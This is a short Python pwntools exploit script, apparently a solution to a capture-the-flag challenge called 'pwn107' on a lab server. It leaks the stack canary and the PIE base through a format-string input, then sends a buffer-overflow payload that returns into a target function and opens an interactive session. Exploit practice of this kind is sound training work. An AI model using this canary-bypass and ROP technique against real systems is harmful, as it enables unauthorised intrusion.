from pwn import *

#p = process("./pwn107.pwn107")

binary = context.binary = ELF('./pwn107.pwn107', checksec=False)


p = remote("10.10.178.41", 9007)
rop = ROP(binary)

p.sendline(b"%11$p %13$p")
p.recvuntil(b"streak: ")

result = [int(x,16) for x in p.recvline().split()]


log.success(f"Result : {result}")

canary = result[1]
dynamic_base = result[0] - 0x0780

log.success(f"canary : {hex(canary)} ")
log.success(f"dynamic_base : {hex(dynamic_base)} ")

payload = b"A"*24
payload += p64(canary)
payload += b"A"*8
ret = dynamic_base +  0x06fe
get_streak = dynamic_base + 0x094c
payload += p64(ret)
payload += p64(get_streak)

p.sendline(payload)
p.interactive()
